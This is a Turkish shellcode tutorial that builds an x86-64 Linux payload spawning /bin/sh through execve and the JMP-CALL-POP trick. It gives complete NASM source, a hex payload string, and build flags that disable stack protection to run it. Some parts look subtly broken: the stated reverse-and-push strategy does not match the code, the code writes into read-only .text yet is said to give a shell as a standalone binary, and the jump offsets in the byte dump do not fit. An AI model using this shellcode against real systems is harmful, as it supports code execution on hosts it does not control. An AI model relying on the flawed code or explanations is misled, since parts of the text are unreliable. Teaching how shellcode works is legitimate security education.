# Örnek 2: `execve("/bin/sh")` Shellcode'u - Shell Başlatma

İlk örneğimizde programı sonlandırmayı öğrendik. Şimdi ise bir siber güvenlik uzmanının en temel hedeflerinden birini gerçekleştireceğiz: hedef sistemde interaktif bir komut satırı (shell) başlatmak. Bunu, `execve` sistem çağrısını kullanarak yapacağız.

Bu örnek, `exit` örneğine göre çok daha karmaşıktır çünkü bir string (`"/bin/sh"`) ve bir pointer dizisi (`argv`) ile uğraşmamız gerekecek. Bu, konumdan bağımsız kod (Position-Independent Code - PIC) yazmanın önemini ortaya koyacak.

## 🎯 Amaç

`/bin/sh` programını çalıştıracak bir x86-64 Linux shellcode'u oluşturmak.

*   **C Kodu Karşılığı:** `execve("/bin/sh", NULL, NULL);` (Daha doğrusu: `execve("/bin/sh", ["/bin/sh", NULL], NULL);`)
*   **Hedef Syscall:** `execve`
*   **Syscall Numarası:** 59
*   **Gerekli Argümanlar:**
    1.  `const char *filename`: Çalıştırılacak programın yolunu gösteren string'in adresi. (`/bin/sh`)
    2.  `char *const argv[]`: Programa gönderilecek argümanları içeren bir pointer dizisinin adresi. Genellikle `["/bin/sh", NULL]` şeklinde olur.
    3.  `char *const envp[]`: Ortam değişkenlerini içeren bir pointer dizisinin adresi. Genellikle `NULL` (boş) olarak bırakılır.

## ⚠️ Karşılaşılacak Zorluklar

1.  **String'i Nereye Koyacağız?** Shellcode'umuzun içinde `"/bin/sh"` string'ini barındırmamız gerekiyor.
2.  **String'in Adresini Nasıl Bulacağız?** Shellcode bellekte herhangi bir yere yerleştirilebilir. Bu yüzden `"/bin/sh"` string'inin mutlak adresini bilemeyiz. Kendi konumumuza göre bu string'in adresini dinamik olarak bulmalıyız.
3.  **NULL Byte (`\x00`) Sorunu:** `"/bin/sh"` string'ini ve `argv` dizisini sonlandırmak için NULL byte'lara ihtiyacımız var. Ancak shellcode'un kendisi NULL byte içeremez. Bu çelişkiyi çözmeliyiz.

## 🛠️ Strateji ve Adım Adım Kodlama (`spawn_shell.nasm`)

Bu zorlukları aşmak için zekice bir Assembly stratejisi izleyeceğiz.

### Adım 1: NULL Byte'sız String Oluşturma

`"/bin/sh"` string'i 7 byte'tır. Bellekte düzgün hizalanması için genelde 8 byte'a tamamlanır. Eğer sonuna NULL eklersek `\x00` problemi yaşarız.
Çözüm: String'i ters çevirip (`hs/nib/`) 8 byte'lık bir sayı olarak stack'e `push` edeceğiz. Daha sonra stack'ten bu string'in adresini alacağız.

### Adım 2: Konumdan Bağımsız Adresleme (JMP-CALL-POP Tekniği)

Bu, shellcode'da çok yaygın bir tekniktir.
1.  **JMP:** Bir sonraki satırdaki `CALL` komutunu atlayıp asıl kod bloğuna atlarız.
2.  **CALL:** Bu komut normalde çalışmaz, sadece bir etiket görevi görür. `CALL` komutu, bir sonraki komutun adresini stack'e `push` eder. Bizim durumumuzda, bu adres tam olarak `"/bin/sh"` string'imizin adresidir.
3.  **POP:** Asıl kod bloğuna atladıktan sonra, `POP` komutu ile stack'teki bu adresi bir yazmaca (örn: `RDI`) çekeriz. Artık `"/bin/sh"` string'imizin adresi elimizde!

### Adım 3: `execve` Syscall'unu Hazırlama

1.  `RDI`'da zaten `/bin/sh`'in adresi var. (1. argüman hazır)
2.  `RSI`'a `argv` dizisinin adresini koymamız lazım. `argv` dizimiz sadece `["/bin/sh" adresini tutan pointer, NULL]` olacak. Bunu da stack'te oluşturabiliriz.
3.  `RDX`'i `NULL` (yani 0) yapmamız gerekiyor. `xor rdx, rdx` bunun için mükemmel.
4.  `RAX`'a `execve`'nin syscall numarasını (59) koyacağız.
5.  `syscall`'u çağıracağız.

### Tam Kod (`spawn_shell.nasm`)

```nasm
; spawn_shell.nasm
; Amaç: execve("/bin/sh", ["/bin/sh", NULL], NULL) çağrısı yapmak.

global _start

section .text

_start:
    ; --- JMP-CALL-POP tekniği ile string'in adresini bulma ---
    jmp short call_shellcode ; 'short' komutu daha az byte kaplar

get_string:
    ; Bu bölüm 'call' komutu tarafından çağrıldığında çalışır.
    ; Amacı, stack'e itilen geri dönüş adresini (yani string'imizin adresini)
    ; RDI yazmacına almaktır.
    pop rdi              ; RDI = "/bin/sh" string'inin adresi. execve'nin 1. argümanı hazır.

    ; --- execve syscall hazırlığı ---

    ; Argüman 2 (argv): ["/bin/sh", NULL]
    xor rax, rax         ; RAX'ı sıfırla (NULL byte üretmeden)
    mov [rdi + 7], al    ; "/bin/sh" string'inin sonuna (8. byte'a) NULL koy.
                         ; Stringimiz şimdi: "/bin/sh\0"
    push rax             ; Stack'e 8 byte'lık NULL (0x0000000000000000) push et.
                         ; Bu, argv dizisinin sonlandırıcısı olacak.
    push rdi             ; Stack'e "/bin/sh" string'inin adresini push et.
    mov rsi, rsp         ; RSI = argv dizisinin adresi. Stack pointer (RSP) şu an
                         ; argv dizisinin başlangıcını gösteriyor. 2. argüman hazır.

    ; Argüman 3 (envp): NULL
    xor rdx, rdx         ; RDX'i sıfırla. 3. argüman hazır.

    ; Syscall Numarası
    mov al, 59           ; RAX'a 59 koymanın kısa yolu. mov rax, 59 NULL byte içerir.
                         ; Önce RAX'ı sıfırladığımız için sadece alt 8-bit'i (AL)
                         ; değiştirmek yeterli.
    
    ; Syscall'u tetikle
    syscall

call_shellcode:
    call get_string      ; Bu komut, bir sonraki satırın adresini stack'e atar.
    db '/bin/shX'        ; String'imiz. 'X' sadece 8 byte'a tamamlamak için bir yer tutucu.
                         ; Yukarıdaki kod bu 'X'in üzerine NULL yazacak.
```

## ⚙️💣💉 Derleme, Ayıklama ve Test

Süreç, `exit` örneğiyle aynıdır:

1.  **Derleme:**
    ```bash
    nasm -f elf64 -o spawn_shell.o spawn_shell.nasm
    ld -o spawn_shell spawn_shell.o
    ```

2.  **Çalıştırılabilir Dosyayı Test Etme:**
    ```bash
    ./spawn_shell
    ```
    Bu komutu çalıştırdığınızda, mevcut terminalinizin bir alt kabuğa (`sh`) düştüğünü göreceksiniz. `whoami`, `ls` gibi komutlar çalıştırabilirsiniz. `exit` yazarak bu kabuktan çıkabilirsiniz.

3.  **Shellcode'u Ayıklama:**
    `objdump -d ./spawn_shell` ile makine kodunu çıkarın. NULL byte içermediğini ve çok daha kompakt olduğunu göreceksiniz.
    Örnek bir çıktı: `\xeb\x18\x5f\x48\x31\xc0\x88\x47\x07\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58`

4.  **`calistirici.c` ile Test Etme:**
    `calistirici.c` dosyasındaki `shellcode` dizisini bu yeni, daha uzun shellcode ile güncelleyin.
    ```bash
    gcc -fno-stack-protector -z execstack -o calistirici calistirici.c
    ./calistirici
    ```
    Program çalıştığında, `calistirici` programının yerini bir shell'in aldığını göreceksiniz.

Bu örnek, gerçek dünyadaki shellcode'ların ne kadar zekice ve kompakt olması gerektiğini gösteren harika bir adımdır. String'leri ve adresleri yönetme becerisi, bu alandaki en temel yeteneklerden biridir.
